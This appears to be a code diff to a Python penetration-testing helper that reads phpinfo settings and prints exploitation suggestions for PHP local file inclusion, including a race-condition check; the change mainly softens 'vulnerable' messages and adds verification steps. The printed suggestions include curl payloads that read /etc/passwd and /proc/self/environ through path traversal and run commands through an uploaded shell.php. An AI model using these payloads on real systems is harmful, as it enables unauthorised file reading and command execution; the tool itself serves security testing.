@@ -464,17 +464,24 @@ def generate_phpinfo_lfi_suggestions(config, target_url, tmp_pattern):
     Generate exploitation suggestions for PHPInfo LFI vulnerability
     """
     suggestions = []
-    suggestions.append(f"{Fore.LIGHTRED_EX}[!] CRITICAL: PHPINFO LFI RACE CONDITION VULNERABILITY DETECTED{Style.RESET_ALL}")
+    suggestions.append(f"{Fore.LIGHTRED_EX}[!] POTENTIAL PHPINFO LFI RACE CONDITION VULNERABILITY{Style.RESET_ALL}")
+    suggestions.append("NOTE: This requires a confirmed LFI vulnerability to be exploitable!")
     suggestions.append("Reference: https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf")
     suggestions.append("")
     
-    suggestions.append("Confirmed Vulnerability Requirements:")
+    suggestions.append("Prerequisites for Exploitation:")
     suggestions.append("✓ PHPInfo page accessible and disclosing upload information")
     suggestions.append("✓ File uploads enabled")
     suggestions.append("✓ File stream wrapper available")
     suggestions.append(f"✓ Temporary file pattern: {tmp_pattern}")
+    suggestions.append("⚠ Manual confirmation of LFI vulnerability required")
     suggestions.append("")
     
+    suggestions.append("Steps to Verify:")
+    suggestions.append("1. First confirm LFI vulnerability exists:")
+    suggestions.append(f"   curl '{target_url}?page=../../../etc/passwd'")
+    suggestions.append("2. If LFI is confirmed, then this vulnerability may be exploitable")
+    suggestions.append("")
     
     return suggestions
 
@@ -514,11 +521,12 @@ def generate_exploitation_suggestions(config, streams, target_url):
         suggestions.append(f"  curl '{target_url}?page=../../../proc/self/environ'")
         suggestions.append("")
         
-        # If we have file uploads, combine with LFI
-        if config.get("file_uploads", "").lower() == "on":
+    # If we have file uploads and a valid upload directory, combine with LFI
+    if config.get("file_uploads", "").lower() == "on":
+        upload_dir = config.get("upload_tmp_dir", "").strip()
+        if upload_dir.lower() not in ["", "no value", "none"]:
             suggestions.append("LFI + Upload Chain:")
-            upload_path = config.get("upload_tmp_dir", "/tmp")
-            suggestions.append(f"  curl '{target_url}?page={upload_path}/shell.php&cmd=id'")
+            suggestions.append(f"  curl '{target_url}?page={upload_dir}/shell.php&cmd=id'")
             suggestions.append("")
 
     # 3. PHP Stream Attacks - If specific wrappers available
@@ -698,10 +706,12 @@ def print_and_save_output(config, attacks, config_mapping, stream_messages, stre
     print(f"\n{Fore.CYAN}[+] PHPInfo LFI Vulnerability Check:")
     lines.append("\n[+] PHPInfo LFI Vulnerability Check:")
     if is_phpinfo_lfi_vulnerable:
-        print(f"{Fore.LIGHTRED_EX}[!] VULNERABLE: PHPInfo LFI Race Condition possible!")
-        print(f"[+] Temporary file pattern: {tmp_pattern}{Style.RESET_ALL}")
-        lines.append("[!] VULNERABLE: PHPInfo LFI Race Condition possible!")
+        print(f"{Fore.YELLOW}[!] POTENTIAL VULNERABILITY: PHPInfo LFI Race Condition possible if LFI exists!")
+        print(f"[+] Temporary file pattern: {tmp_pattern}")
+        print(f"{Fore.YELLOW}[!] Manual confirmation of LFI vulnerability required{Style.RESET_ALL}")
+        lines.append("[!] POTENTIAL VULNERABILITY: PHPInfo LFI Race Condition possible if LFI exists!")
         lines.append(f"[+] Temporary file pattern: {tmp_pattern}")
+        lines.append("[!] Manual confirmation of LFI vulnerability required")
     else:
         print(f"{Fore.GREEN}[+] Not vulnerable to PHPInfo LFI")
         for reason in reasons:
